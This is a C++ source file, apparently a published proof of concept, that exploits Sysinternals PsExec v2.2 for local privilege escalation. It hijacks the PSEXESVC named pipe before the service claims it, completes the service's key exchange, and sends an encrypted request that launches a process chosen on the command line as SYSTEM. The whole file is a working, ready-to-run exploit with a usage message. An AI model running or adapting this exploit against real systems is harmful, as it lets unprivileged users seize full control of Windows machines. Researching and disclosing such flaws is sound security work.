//David Wells
//Psexec Escalation
//11-17-2020
//Tested with PsExec v2.2 (md5:27304B246C7D5B4E149124D5F93C5B01)
#include <iostream>
#include <Windows.h>
#include <string>
#include <sstream>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <AclAPI.h>

// PSexec process structure sent to PSEXESVC
typedef struct psexecProcess {
    BYTE padding_0[0x210];
    wchar_t processPath[0x100];
    DWORD p0[2] = { 0 };
    wchar_t processArg[0x100];
    BYTE padding_1[0x3cF8] = { 0 };
    wchar_t currentDirectory[0x100] = { 0 };
    BYTE padding_3[0x110] = { 0 };
    bool IsSystem = true;
    BYTE padding_4[0xD] = { 1 };
    BYTE desktop = 0;
    BYTE padding_5[0x5] = { 0 };
    bool ImpersonateClient = false;
    BYTE padding_6[0x4000];
};

bool ProcessExists(const wchar_t procName[MAX_PATH]) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    bool procFound = false;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry) == TRUE)
        while (Process32Next(snapshot, &entry) == TRUE)
            if (lstrcmpi((wchar_t*)entry.szExeFile, procName) == 0) {
                procFound = true;
            }
    CloseHandle(snapshot);
    return procFound;
}

void PsExec(wchar_t processPath[0x100], wchar_t processArg[0x100]) {
    DWORD returned = 0, written = 0;
    HANDLE hPipe = NULL;
    HCRYPTPROV prov = NULL;
    HCRYPTKEY psexecKey = NULL;
    HCRYPTKEY ourKey = NULL;
    DWORD dataLen = 0x4a5c;
    DWORD len = 0;
    DWORD pdwDataLen = 0x4a5c;
    psexecProcess* proc = new psexecProcess;
    //Apply commandline params
    if(processPath != NULL)
        lstrcpyW(proc->processPath, processPath);
    if (processArg != NULL)
        lstrcpyW(proc->processArg, processArg);
    BYTE pipeBuffer[0xC000] = { 0xc8 }; // version info
    //Hog named pipe needed by PSEXESVC
    hPipe = CreateNamedPipe(L"\\\\.\\pipe\\PSEXESVC", PIPE_ACCESS_DUPLEX, PIPE_READMODE_MESSAGE | PIPE_TYPE_MESSAGE, 0xff, 0x10000, 0x10000, 0x2710, NULL);
    //Wait for PSEXESVC to spawn
    while (!ProcessExists(L"PSEXESVC.EXE"))
        continue;
    Sleep(3000);
    //Tell PSEXESVC there is an incomming "namedpipe connection"
    hPipe = CreateFile(L"\\\\.\\pipe\\PSEXESVC", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); 
    // Send/Receive Version info
    WriteFile(hPipe, pipeBuffer, 0x10, &returned, NULL);
    returned = 0;
    // Version info
    ReadFile(hPipe, pipeBuffer, 0x10, &returned, NULL);
    // Read Incomming key size
    ReadFile(hPipe, pipeBuffer, 4, &returned, NULL);
    len = pipeBuffer[0];
    // Read and import PsexecSVC Key
    ReadFile(hPipe, pipeBuffer, len, &returned, NULL);
    if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0))
        if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 8))
            if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0x20))
                if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0x28))
                    return;
    CryptImportKey(prov, pipeBuffer, len, 0, CRYPT_EXPORTABLE, &psexecKey);
    //Generate and export our key
    CryptGenKey(prov, 0x6610, CRYPT_EXPORTABLE, &ourKey);
    len = 0;
    CryptExportKey(ourKey, psexecKey, SIMPLEBLOB, 0, 0, &len);
    BYTE* keybuff = (BYTE*)HeapAlloc(GetProcessHeap(), MEM_COMMIT | MEM_RESERVE, len);
    CryptExportKey(ourKey, psexecKey, SIMPLEBLOB, 0, keybuff, &len);
    // Send our Key to PSEXECSVC
    WriteFile(hPipe, &len, 0x4, &returned, NULL);
    WriteFile(hPipe, keybuff, len, &returned, NULL);
    // Encrypt and send our process information to launch as SYSTEM
    CryptEncrypt(ourKey, NULL, true, 0, NULL, &pdwDataLen, dataLen);
    CryptEncrypt(ourKey, NULL, true, 0, (BYTE*)proc, &dataLen, pdwDataLen);
    WriteFile(hPipe, &dataLen, 0x4, &returned, NULL);
    WriteFile(hPipe, proc, dataLen, &returned, NULL); // Encrypted Data
}

VOID Usage() {
    std::cout << "Usage: PsExecEscalation.exe <processPath> (optional: <processArguments>)" << std::endl;
    exit(0);
}

int main()
{
    int args = 0;
    LPWSTR* cmdLine = CommandLineToArgvW(GetCommandLine(), &args);
    if (args <= 1)
        Usage();
    else if(args == 2)
        PsExec(cmdLine[1], NULL);
    else
        PsExec(cmdLine[1], cmdLine[2]);
}
